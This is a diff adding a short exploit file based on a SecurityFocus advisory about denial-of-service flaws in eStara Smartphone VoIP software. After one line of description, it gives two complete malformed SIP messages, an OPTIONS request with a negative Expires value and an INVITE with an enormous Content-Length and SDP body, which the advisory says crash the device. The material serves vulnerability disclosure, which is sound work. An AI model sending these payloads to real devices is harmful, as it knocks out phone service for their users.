@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/16629/info
+ 
+eStara Smartphone is prone to multiple denial-of-service vulnerabilities when processing malformed VOIP headers. Successful exploitation will cause the device to crash.
+
+For the negative 'Expires' field issue:
+
+OPTIONS sip:a@127.0.0.1 SIP/2.0
+Via: SIP/2.0/UDP 172.16.3.6:3334;branch=z9hG4bK00001793z9hG4bK.00001FDB
+From: 1793 <sip:a@127.0.0.1>;tag=1793
+To: zwell <sip:a@127.0.0.1>
+Call-ID: 1407@172.16.3.6
+CSeq: 5185 OPTIONS
+Expires: -127
+
+For the 'Content-Length' field issue:
+
+INVITE sip:a@127.0.0.1 SIP/2.0
+Via: SIP/2.0/UDP 172.16.3.6:3333;branch=z9hG4bK00002386z9hG4bK.0000234E
+From: 2386 <sip:a@127.0.0.1>;tag=2386
+To: zwell <sip:a@127.0.0.1>
+Call-ID: 31442@172.16.3.6
+CSeq: 4896 INVITE
+Content-Type: application/sdp
+Content-Length: 1111111111
+
+v=0
+o=2386 2386 2386 IN IP4 172.16.3.6
+s=Session SDP
+c=IN IP4 172.16.3.6
+t=0 0
+m=audio 9876 RTP/AVP 0
+a=rtpmap:0 PCMU/8000
